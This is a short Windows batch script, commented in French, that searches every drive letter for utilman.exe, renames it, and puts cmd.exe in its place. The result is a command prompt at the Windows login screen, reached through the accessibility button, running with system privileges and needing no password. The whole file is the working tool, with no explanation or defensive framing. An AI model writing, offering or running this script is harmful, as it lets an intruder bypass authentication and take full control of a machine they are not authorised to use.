setlocal

rem Rechercher le fichier utilman.exe dans chaque disque.
for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%D:\windows\system32\utilman.exe (
        echo Found utilman.exe in %%D:\windows\system32\
        ren %%D:\windows\system32\utilman.exe utilman.bak
        if exist %%D:\windows\system32\cmd.exe (
            echo Copying cmd.exe to replace utilman.exe
            xcopy %%D:\windows\system32\cmd.exe %%D:\windows\system32\utilman.exe /y
        ) else (
            echo cmd.exe not found in %%D:\windows\system32\
        )
    )
)

endlocal
echo Script completed.
pause
